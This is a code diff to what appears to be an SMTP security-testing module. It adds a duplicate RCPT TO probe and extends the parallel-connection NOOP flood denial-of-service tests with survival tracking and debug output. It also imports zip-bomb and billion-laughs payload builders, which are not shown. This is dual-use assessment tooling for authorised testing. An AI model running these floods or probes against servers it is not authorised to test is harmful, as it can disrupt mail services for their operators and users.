@@ -1,4 +1,5 @@
 import argparse, ipaddress, json, os, queue, random, re, secrets, shutil, smtplib, socket, ssl, statistics, struct, subprocess, sys, textwrap, threading, time, unicodedata, zipfile, dns.resolver
+from datetime import datetime, timedelta, timezone
 from base64 import b64decode, b64encode
 from io import BytesIO
 from dataclasses import dataclass
@@ -33,8 +34,14 @@ from .utils.helpers import (
 )
 from .utils.blacklist_parser import BlacklistParser
 from .utils.service_identification import identify_service
-from .utils.smtp_fingerprints import ServerIdentifyResult, identify_smtp_server
+from .utils.smtp_fingerprints import (
+    ServerIdentifyResult,
+    identify_smtp_server,
+    _hostname_from_banner,
+    _cert_covers_dname,
+)
 from .utils.behavior_profiles import PROFILE_MISSING_HINTS
+from .decompression_payloads import BILLION_LAUGHS_XML, build_full_zip_bomb, build_minimal_zip_bomb
 
 try:
     from cryptography import x509
@@ -446,6 +453,22 @@ RCPT_LIMIT_POLICY_REJECT_CAP = 50
 # Terminal verdict / JSON ManyRcpt: OK ≤100, warning 101–500, error / vuln >500
 RCPT_LIMIT_VERDICT_OK_MAX = 100
 RCPT_LIMIT_VERDICT_WARN_MAX = 500
+# Post-hit disconnect probe: how many extra RCPT TO are sent after the per-message
+# limit is detected to determine whether the server eventually closes the session.
+RCPT_LIMIT_POSTHIT_PROBE_COUNT = 20
+
+# Duplicate RCPT TO (-rdd): same envelope recipient repeated N times in one MAIL transaction.
+# RFC 5321 does not forbid this; delivery fan-out is implementation-defined (dedupe vs N copies).
+RCPT_DUP_DEFAULT = 10
+RCPT_DUP_MAX = 50
+
+
+def _rcpt_duplicate_error_is_environmental(err: str | None) -> bool:
+    """True when duplicate-RCPT probe cannot start (policy / AUTH), not a vulnerability finding."""
+    if not err:
+        return False
+    return "MAIL FROM rejected for all candidates" in err
+
 
 # Parallel SMTP sessions (-rt / --rate-limit): default max ramp-up attempts
 RATE_LIMIT_DEFAULT_ATTEMPTS = 100
@@ -498,6 +521,8 @@ NOOP_FLOOD2_RUN_SECONDS = 30.0              # steady-state duration (per thread)
 NOOP_FLOOD2_CONNECT_TIMEOUT = 10.0
 NOOP_FLOOD2_RECV_TIMEOUT = 30.0
 NOOP_FLOOD2_AVG_TIME_OK_MAX_SECONDS = 5.0   # avg time between NOOPs under load ≤ this → OK
+NOOP_FLOOD2_DEBUG_TICK_SECONDS = 2.0        # -vv only: emit persistent ptdebug snapshot every Ns
+NOOP_FLOOD1_DEBUG_TICK_SECONDS = 2.0        # -vv only: same, for the single-connection storm
 
 
 class NoopFlood1Result(NamedTuple):
@@ -530,6 +555,10 @@ class NoopFlood2Result(NamedTuple):
     max_rt_seconds: float | None
     avg_rt_seconds: float | None       # Mean per-command round-trip across all threads
     error_rate_pct: float              # 100 * commands_error / commands_sent
+    # ── Connection-survival tracking (added with the live "active" probe) ──
+    active_connections_end: int = 0    # Sockets still alive when the storm finished
+    disconnected_during_test: int = 0  # established - active_connections_end
+    early_exit_no_connections: bool = False  # All sockets dropped before the time limit
 
 
 def _noop_rt_window_display(value: float | None) -> str:
@@ -583,6 +612,25 @@ class RcptLimitResult(NamedTuple):
     skip_reason: str | None = None  # 'mta_not_relay_no_wordlist' | 'submission_auth_required' | 'auth_failed'
     skip_message: str | None = None  # Human-readable explanation for output / JSON
     recipients_source: str | None = None  # 'synthetic' (1@dom, 2@dom) | 'wordlist' (real local users)
+    # ── Post-hit disconnect probe (only when limit_triggered is True) ───────────
+    disconnect_after_limit: bool | None = None  # True = server closed session after extra rejects;
+                                                # False = stayed open through full POSTHIT probe;
+                                                # None = not measured (skipped/error/no limit found)
+    posthit_probe_count: int = 0  # Number of additional RCPT TOs sent after limit hit
+
+
+class RcptDuplicateResult(NamedTuple):
+    """Same address repeated in multiple RCPT TO within one MAIL transaction (-rdd)."""
+    recipient: str
+    duplicate_count: int
+    rcpt_replies: tuple[tuple[int, str], ...]
+    all_rcpt_2xx: bool
+    first_failure_index: int | None
+    data_sent: bool
+    data_code: int | None
+    data_reply_snippet: str | None
+    mail_from_used: str | None
+    probe_uuid: str | None
 
 
 class AcceptedDomainProbeResult(NamedTuple):
@@ -1160,6 +1208,8 @@ class SMTPResults:
     catch_all: CatchAllResult | None = None  # "configured" | "not_configured" | "indeterminate"
     rcpt_limit: RcptLimitResult | None = None
     rcpt_limit_error: str | None = None
+    rcpt_duplicate: RcptDuplicateResult | None = None
+    rcpt_duplicate_error: str | None = None
     role: RoleResult | None = None
     role_error: str | None = None  # When role identification test fails
     auth_enum: AuthEnumResult | None = None
@@ -1228,6 +1278,8 @@ class VULNS(Enum):
     HybridRole = "PTV-SMTP-HYBRIDROLE"
     ManyRcpt = "PTV-SVC-SMTP-MANYRCPT"
     ManyRcptReject = "PTV-SVC-SMTP-MANYRCPTREJECT"
+    RcptNoCut = "PTV-SVC-SMTP-RCPTNOCUT"
+    RcptDuplicate = "PTV-SVC-SMTP-RCPTDUP"
     NoStarttls = "PTV-SVC-SMTP-NOSTARTTLS"
     NTLM = "PTV-SVC-NTLMINFO"
     OpenRelay = "PTV-SVC-SMTP-RELAY"
@@ -1261,6 +1313,7 @@ class VULNS(Enum):
     NoopFloodErrors = "PTV-SVC-SMTP-NOOPERR"
     NoopFloodDosSlow = "PTV-SVC-SMTP-NOOPDOSSLOW"
     NoopFloodDosErrors = "PTV-SVC-SMTP-NOOPDOSERR"
+    NoopFloodDosDropAll = "PTV-SVC-SMTP-NOOPDOSDROP"
 
 
 # endregion
@@ -1290,6 +1343,8 @@ class SMTPArgs(ArgsWithBruteforce):
     role_identify: bool
     smtp_role: str | None
     probe_accepted_domain: bool
+    rcpt_duplicate: int | None
+    rcpt_duplicate_send: bool
 
     @staticmethod
     def get_help():
@@ -1327,7 +1382,7 @@ class SMTPArgs(ArgsWithBruteforce):
                 ["-ho", "--helo-only", "", "Test if server supports only HELO without EHLO extensions"],
                 ["-hb", "--helo-bypass", "", "Test HELO/EHLO value for bypassing security restrictions"],
                 ["-m", "--mail-from", "<email>", "Sender address (MAIL FROM)"],
-                ["-r", "--rcpt-to", "<email>", "Recipient (To); required for -bomb, -av, -ssrf, -zipxxe, -sh, -bcc, -al, -br"],
+                ["-r", "--rcpt-to", "<email>", "Recipient (To); required for -bomb, -av, -ssrf, -zipxxe, -sh, -bcc, -al, -br, -rdd"],
                 ["-fn", "--from-name", "<name>", "Sender display name in From header"],
                 ["-cc", "--cc", "<emails>", "CC recipients, comma-separated; required for -bcc"],
                 ["-sh", "--spoof-headers", "", "Test header spoofing (From, Reply-To, Return-Path); requires -r"],
@@ -1349,6 +1404,8 @@ class SMTPArgs(ArgsWithBruteforce):
                 ["-nf1", "--noop-flood1", "", "NOOP flooding test (1 connection, rapid NOOP commands)"],
                 ["-nf2", "--noop-flood2", "<n>", f"NOOP flooding DoS test (default: {NOOP_FLOOD2_DEFAULT_CONNECTIONS} parallel connections)"],
                 ["-rl", "--recipient-limit", "<n>", "Test RCPT TO limit (default: 1000 RCPT attempts; aborts after 50 policy rejects if none accepted)"],
+                ["-rdd", "--rcpt-duplicate", "<n>", f"Probe N duplicate RCPT TO for same address in one MAIL (default {RCPT_DUP_DEFAULT}, max {RCPT_DUP_MAX}; requires -r)"],
+                ["", "--rdd-send", "", "With -rdd: send minimal DATA after RCPT so analyst can verify mailbox copies manually"],
                 ["", "--rl-no-precheck", "", "Skip role/open-relay/auth pre-check for -rl (run RCPT TO probe directly)"],
                 ["-d", "--domain", "<domain>", "Recipient domain for RCPT TO limit test"],
                 ["-pd", "--probe-accepted-domain", "", "Probe which recipient domain RCPT treats as local"],
@@ -1719,6 +1776,31 @@ class SMTPArgs(ArgsWithBruteforce):
             ),
         )
         direct.add_argument(
+            "-rdd",
+            "--rcpt-duplicate",
+            nargs="?",
+            type=int,
+            const=RCPT_DUP_DEFAULT,
+            default=None,
+            metavar="N",
+            dest="rcpt_duplicate",
+            help=(
+                "Send RCPT TO repeatedly for the same recipient in one MAIL transaction "
+                f"(N times, default {RCPT_DUP_DEFAULT}, max {RCPT_DUP_MAX}; requires -r/--rcpt-to). "
+                "SMTP acceptance does not prove N mailbox deliveries — use --rdd-send for a minimal "
+                "message and verify the inbox manually."
+            ),
+        )
+        direct.add_argument(
+            "--rdd-send",
+            action="store_true",
+            dest="rcpt_duplicate_send",
+            help=(
+                "With -rdd: after all RCPT replies, submit one minimal DATA payload (Message-ID + "
+                "X-Penterep-RDD-Probe) so the analyst can correlate manual inbox checks."
+            ),
+        )
+        direct.add_argument(
             "-d", "--domain",
             type=str,
             metavar="domain",
@@ -2013,6 +2095,20 @@ class SMTP(BaseModule):
                 )
             if not args.rcpt_to or not str(args.rcpt_to).strip():
                 raise argparse.ArgumentError(None, "-br/--bounce-replay requires -r/--rcpt-to (recipient)")
+        rdd_n = getattr(args, "rcpt_duplicate", None)
+        if rdd_n is not None:
+            if not args.rcpt_to or not str(args.rcpt_to).strip():
+                raise argparse.ArgumentError(
+                    None, "-rdd/--rcpt-duplicate requires -r/--rcpt-to (same address is probed)"
+                )
+            if rdd_n < 2:
+                raise argparse.ArgumentError(None, "-rdd/--rcpt-duplicate N must be at least 2")
+            if rdd_n > RCPT_DUP_MAX:
+                raise argparse.ArgumentError(
+                    None, f"-rdd/--rcpt-duplicate N must not exceed {RCPT_DUP_MAX}"
+                )
+        if getattr(args, "rcpt_duplicate_send", False) and rdd_n is None:
+            raise argparse.ArgumentError(None, "--rdd-send requires -rdd/--rcpt-duplicate")
         # Canary required only for XXE variants; billion_laughs and zip_bomb work without it
         if zipxxe_requested:
             variants_arg = getattr(args, "zipxxe_variants", None)
@@ -2129,6 +2225,7 @@ class SMTP(BaseModule):
             or getattr(self.args, "noop_flood1", False)
             or getattr(self.args, "noop_flood2", None) is not None
             or getattr(self.args, "rcpt_limit", False)
+            or getattr(self.args, "rcpt_duplicate", None) is not None
             or getattr(self.args, "probe_accepted_domain", False)
             or self.do_brute
         )
@@ -2143,6 +2240,8 @@ class SMTP(BaseModule):
     def run(self):
         self.results = SMTPResults()
         smtp = None
+        if getattr(self.args, "rl_no_precheck", False) and not getattr(self.args, "rcpt_limit", None):
+            self.args.rcpt_limit = RCPT_LIMIT_DEFAULT_ATTEMPTS
         self.run_all_mode = self._is_run_all_mode()
 
         if self.run_all_mode:
@@ -2189,6 +2288,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2217,6 +2317,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2246,6 +2347,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2276,6 +2378,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2308,6 +2411,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2350,6 +2454,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2416,6 +2521,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2454,6 +2560,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2493,6 +2600,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
             and not getattr(self.args, "invalid_commands", False)
@@ -2526,6 +2634,7 @@ class SMTP(BaseModule):
             and self.args.enumerate is None
             and not self.args.rate_limit
             and not self.do_brute
+            and getattr(self.args, "rcpt_duplicate", None) is None
         ):
             if not self.use_json:
                 self.ptprint("Encryption", Out.INFO)
@@ -2547,6 +2656,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2585,6 +2695,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2628,6 +2739,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2663,6 +2775,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
+            and getattr(self.args, "rcpt_duplicate", None) is None
         )
         if only_rcpt_limit:
             self.ptprint("RCPT TO limit", Out.INFO)
@@ -2674,6 +2787,37 @@ class SMTP(BaseModule):
                 self._stream_rcpt_limit_result()
             except Exception as e:
                 self.results.info_error = str(e)
+            return
+
+        # Standalone duplicate RCPT TO (-rdd): same envelope recipient N times in one MAIL
+        only_rcpt_duplicate = (
+            getattr(self.args, "rcpt_duplicate", None) is not None
+            and not getattr(self.args, "rcpt_limit", False)
+            and not self.args.banner
+            and not self.args.commands
+            and not self.args.interactive
+            and not self.args.isencrypt
+            and not self.args.ntlm
+            and not self.args.open_relay
+            and not getattr(self.args, "role_identify", False)
+            and self.args.enumerate is None
+            and not self.args.rate_limit
+            and not getattr(self.args, "noop_flood1", False)
+            and not getattr(self.args, "noop_flood2", None)
+            and not getattr(self.args, "probe_accepted_domain", False)
+            and not self.do_brute
+        )
+        if only_rcpt_duplicate:
+            self.ptprint("Duplicate RCPT TO (same recipient)", Out.INFO)
+            try:
+                self.results.rcpt_duplicate = self.test_rcpt_duplicate()
+                self._stream_rcpt_duplicate_result()
+            except TestFailedError as e:
+                self.results.rcpt_duplicate_error = str(e)
+                self._stream_rcpt_duplicate_result()
+            except Exception as e:
+                self.results.rcpt_duplicate_error = str(e)
+                self._stream_rcpt_duplicate_result()
             return
 
         # Standalone accepted-domain probe only (informational; no PTv code)
@@ -2717,6 +2861,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2742,6 +2887,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2769,6 +2915,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2798,6 +2945,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2825,6 +2973,7 @@ class SMTP(BaseModule):
             and not self.args.rate_limit
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2852,6 +3001,7 @@ class SMTP(BaseModule):
             and not self.args.rate_limit
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2882,6 +3032,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2911,6 +3062,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2939,6 +3091,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2967,6 +3120,7 @@ class SMTP(BaseModule):
             and not getattr(self.args, "noop_flood1", False)
             and not getattr(self.args, "noop_flood2", None)
             and not getattr(self.args, "rcpt_limit", False)
+            and getattr(self.args, "rcpt_duplicate", None) is None
             and not getattr(self.args, "probe_accepted_domain", False)
             and not self.do_brute
         )
@@ -2998,6 +3152,7 @@ class SMTP(BaseModule):
             or self.args.enumerate is not None
             or self.args.rate_limit
             or getattr(self.args, "rcpt_limit", False)
+            or getattr(self.args, "rcpt_duplicate", None) is not None
             or self.do_brute
         )
         if need_info:
@@ -3143,6 +3298,16 @@ class SMTP(BaseModule):
                     self.results.rcpt_limit_error = str(e)
                 self._stream_rcpt_limit_result()
 
+            if getattr(self.args, "rcpt_duplicate", None) is not None:
+                self.ptprint("Duplicate RCPT TO (same recipient)", Out.INFO)
+                try:
+                    self.results.rcpt_duplicate = self.test_rcpt_duplicate()
+                except TestFailedError as e:
+                    self.results.rcpt_duplicate_error = str(e)
+                except Exception as e:
+                    self.results.rcpt_duplicate_error = str(e)
+                self._stream_rcpt_duplicate_result()
+
             if self.do_brute:
                 self.ptprint("Login bruteforce", Out.INFO)
                 self.results.creds = simple_bruteforce(
@@ -3163,6 +3328,7 @@ class SMTP(BaseModule):
         Excluded from run-all (use flags explicitly):
         - rate_limit (-rt): opens many connections simultaneously, triggers rate limits (421).
         - rcpt_limit (-rl): many RCPT TO probes per session; use -rl explicitly if needed.
+        - rcpt_duplicate (-rdd): repeated RCPT TO for the same address; use -rdd explicitly if needed.
         - invalid_commands (-iv): high server load (fuzzing, long inputs, many connections).
           Use -iv flag explicitly if needed.
         """
@@ -3906,6 +4072,10 @@ class SMTP(BaseModule):
 
     def noop_flood_test_single(self) -> NoopFlood1Result:
         """-nf1: rapid NOOP flood in a single connection (RFC 5321 §4.1.1.9 expects 250)."""
+        # Make `-vv` show the standard "Initial server information" header
+        # (banner + EHLO response) before the storm — same UX as `-rl`.
+        self._ensure_initial_info(fail_label="-nf1 single-connection storm")
+
         self.ptdebug("NOOP Flooding test (single connection)", title=True)
         self.ptdebug(
             f"Target {self.args.target.ip}:{self.args.target.port} — up to "
@@ -3946,6 +4116,7 @@ class SMTP(BaseModule):
         hit_command_cap = False
         hit_time_cap = False
         overall_start = time.perf_counter()
+        last_debug_tick = overall_start  # ``-vv`` time-based safety net for slow servers
 
         try:
             while commands_sent < NOOP_FLOOD1_MAX_COMMANDS:
@@ -3984,7 +4155,12 @@ class SMTP(BaseModule):
                         f"NOOPs sent: {commands_sent} (ok={commands_ok}, err={commands_error})"
                     )
 
-                if commands_sent <= 5 or commands_sent % 25 == 0:
+                # Persistent debug log: per-25 NOOPs *or* every ~2 seconds, whichever
+                # comes first. The time-based fallback keeps slow servers chatty.
+                now = time.perf_counter()
+                _count_tick = commands_sent <= 5 or commands_sent % 25 == 0
+                _time_tick = (now - last_debug_tick) >= NOOP_FLOOD1_DEBUG_TICK_SECONDS
+                if _count_tick or _time_tick:
                     if status is None:
                         self.ptdebug(
                             f"NOOP #{commands_sent}: no / partial reply "
@@ -3998,6 +4174,7 @@ class SMTP(BaseModule):
                             f"— {reply_text[:80]}",
                             Out.INFO,
                         )
+                    last_debug_tick = now
 
                 if closed:
                     disconnected = True
@@ -4064,6 +4241,10 @@ class SMTP(BaseModule):
         """-nf2: parallel-connection NOOP DoS. Opens up to N sockets, each sends NOOPs
         as fast as possible for ``NOOP_FLOOD2_RUN_SECONDS`` seconds; aggregates error
         rate and average command reaction time across all threads."""
+        # Show the standard "Initial server information" header in -vv before any
+        # storm-related log lines (mirrors the -rl flow).
+        self._ensure_initial_info(fail_label="-nf2 parallel storm")
+
         requested = getattr(self.args, "noop_flood2", None) or NOOP_FLOOD2_DEFAULT_CONNECTIONS
         if requested > NOOP_FLOOD2_MAX_CONNECTIONS:
             self.ptdebug(
@@ -4099,6 +4280,10 @@ class SMTP(BaseModule):
 
         # ── Phase 1: establish sockets ───────────────────────────────────
         connections: list = []
+        # Persistent ramp-up milestones in -vv: a snapshot every ~5% of the
+        # requested pool (capped at ~50 lines for very large pools).
+        ramp_step = max(1, requested // 20)
+        ramp_t0 = time.perf_counter()
         for i in range(requested):
             try:
                 smtp = self._connect_silent(timeout=NOOP_FLOOD2_CONNECT_TIMEOUT, send_ehlo=True)
@@ -4109,6 +4294,12 @@ class SMTP(BaseModule):
                 connections.append(smtp)
                 if _show_progress:
                     _write_live(f"Connecting: {len(connections)}/{requested}")
+                if len(connections) % ramp_step == 0 or len(connections) == requested:
+                    self.ptdebug(
+                        f"-nf2 ramp-up: {len(connections)}/{requested} sockets established "
+                        f"(elapsed {time.perf_counter() - ramp_t0:.1f}s).",
+                        Out.INFO,
+                    )
             except Exception as exc:
                 self.ptdebug(
                     f"-nf2: connection #{i + 1} refused/failed — {exc} "
@@ -4121,6 +4312,17 @@ class SMTP(BaseModule):
         _finalize_live()
         if not connections:
             raise TestFailedError("Could not establish any connection for -nf2")
+
+        # Persistent (visible in normal output too) info about the actual size of
+        # the NOOP storm. The user needs this number to interpret the verdicts —
+        # a 100% error rate over 50 sockets that all stayed open is something
+        # entirely different from 100% errors over 50 sockets that all died.
+        info_icon = get_colored_text("[*]", color="INFO")
+        self.ptprint(
+            f"    {info_icon} Established {established} connections"
+            + (f" (out of {requested} requested)" if established != requested else ""),
+            Out.TEXT,
+        )
 
         self.ptdebug(
             f"-nf2: {established}/{requested} sockets established; starting NOOP storm "
@@ -4135,6 +4337,10 @@ class SMTP(BaseModule):
         agg_commands_ok = 0
         agg_commands_error = 0
         agg_rtts: list[float] = []
+        # Live count of sockets still up. Decremented as soon as a worker exits
+        # its hammer-loop (close/timeout/exception). Read by the progress ticker
+        # to render `(active K/N)` and to detect the all-dropped condition.
+        active_count = established
 
         FLUSH_EVERY = 32  # flush per-thread counters into the shared aggregates this often
 
@@ -4148,34 +4354,44 @@ class SMTP(BaseModule):
                     agg_rtts.extend(local_rtts)
 
         def _worker(smtp) -> None:
+            nonlocal active_count
             sock = smtp.sock
             local_sent = 0
             local_ok = 0
             local_err = 0
             local_rtts: list[float] = []
-            while not stop_event.is_set():
-                try:
-                    t0 = time.perf_counter()
-                    sock.sendall(b"NOOP\r\n")
-                    status, _raw, closed = self._noop_read_one_reply(sock)
-                    rt = time.perf_counter() - t0
-                    local_sent += 1
-                    if status == 250:
-                        local_ok += 1
-                        local_rtts.append(rt)
-                    else:
+            socket_died = False  # True only if the *socket* failed during the storm,
+                                 # NOT when the worker exits cleanly due to stop_event.
+            try:
+                while not stop_event.is_set():
+                    try:
+                        t0 = time.perf_counter()
+                        sock.sendall(b"NOOP\r\n")
+                        status, _raw, closed = self._noop_read_one_reply(sock)
+                        rt = time.perf_counter() - t0
+                        local_sent += 1
+                        if status == 250:
+                            local_ok += 1
+                            local_rtts.append(rt)
+                        else:
+                            local_err += 1
+                        if local_sent % FLUSH_EVERY == 0:
+                            _flush(local_sent, local_ok, local_err, local_rtts)
+                            local_sent = local_ok = local_err = 0
+                            local_rtts = []
+                        if closed:
+                            socket_died = True
+                            break
+                    except (OSError, ConnectionError):
+                        local_sent += 1
                         local_err += 1
-                    if local_sent % FLUSH_EVERY == 0:
-                        _flush(local_sent, local_ok, local_err, local_rtts)
-                        local_sent = local_ok = local_err = 0
-                        local_rtts = []
-                    if closed:
+                        socket_died = True
                         break
-                except (OSError, ConnectionError):
-                    local_sent += 1
-                    local_err += 1
-                    break
-            _flush(local_sent, local_ok, local_err, local_rtts)
+            finally:
+                _flush(local_sent, local_ok, local_err, local_rtts)
+                if socket_died:
+                    with results_lock:
+                        active_count -= 1
 
         threads: list[threading.Thread] = []
         run_start = time.perf_counter()
@@ -4184,17 +4400,42 @@ class SMTP(BaseModule):
             threads.append(t)
             t.start()
 
-        # Live progress ticker while NOOP storm runs.
+        # Live progress ticker while NOOP storm runs. Also performs early-exit
+        # if every socket has been dropped by the server before the time limit
+        # — a strong sign of a successful disconnect-storm DoS.
         deadline = run_start + NOOP_FLOOD2_RUN_SECONDS
+        early_exit_no_conns = False
+        # ``-vv`` only: emit a persistent (scrolling, not erasable) snapshot every
+        # NOOP_FLOOD2_DEBUG_TICK_SECONDS so the analyst sees what the storm is
+        # actually doing instead of staring at a 30-second silence between
+        # "starting NOOP storm" and the final summary.
+        last_debug_tick = run_start
+        prev_active = established
         while time.perf_counter() < deadline:
+            with results_lock:
+                cs, co, ce = agg_commands_sent, agg_commands_ok, agg_commands_error
+                active_now = active_count
+            if active_now == 0:
+                early_exit_no_conns = True
+                break
             if _show_progress:
                 remaining = int(deadline - time.perf_counter())
-                with results_lock:
-                    cs, co, ce = agg_commands_sent, agg_commands_ok, agg_commands_error
                 _write_live(
-                    f"NOOP storm ({established} sockets): {cs} sent "
+                    f"NOOP storm (active {active_now}/{established}): {cs} sent "
                     f"(ok={co}, err={ce}) — {remaining:02d}s left"
                 )
+            now = time.perf_counter()
+            if now - last_debug_tick >= NOOP_FLOOD2_DEBUG_TICK_SECONDS:
+                elapsed = now - run_start
+                drops = max(0, prev_active - active_now)
+                drop_note = f", -{drops} since last tick" if drops else ""
+                self.ptdebug(
+                    f"-nf2 storm tick t={elapsed:.1f}s: active={active_now}/{established}, "
+                    f"sent={cs}, ok={co}, err={ce}{drop_note}.",
+                    Out.INFO,
+                )
+                last_debug_tick = now
+                prev_active = active_now
             time.sleep(0.5)
         stop_event.set()
         for t in threads:
@@ -4214,12 +4455,17 @@ class SMTP(BaseModule):
         error_rate_pct = (
             100.0 * agg_commands_error / agg_commands_sent if agg_commands_sent else 0.0
         )
+        # All workers have joined at this point, so active_count is final.
+        with results_lock:
+            active_end = max(active_count, 0)
+        disconnected_during = max(established - active_end, 0)
 
         self.ptdebug(
             f"-nf2 summary: established={established}/{requested}, "
-            f"duration={run_duration:.1f}s, sent={agg_commands_sent}, "
-            f"ok={agg_commands_ok}, error={agg_commands_error} ({error_rate_pct:.1f}%), "
-            f"avg_rt={avg_rt}.",
+            f"active_end={active_end}, dropped_during_test={disconnected_during}, "
+            f"early_exit={early_exit_no_conns}, duration={run_duration:.1f}s, "
+            f"sent={agg_commands_sent}, ok={agg_commands_ok}, "
+            f"error={agg_commands_error} ({error_rate_pct:.1f}%), avg_rt={avg_rt}.",
             Out.INFO,
         )
 
@@ -4234,6 +4480,9 @@ class SMTP(BaseModule):
             max_rt_seconds=max_rt,
             avg_rt_seconds=avg_rt,
             error_rate_pct=error_rate_pct,
+            active_connections_end=active_end,
+            disconnected_during_test=disconnected_during,
+            early_exit_no_connections=early_exit_no_conns,
         )
 
 
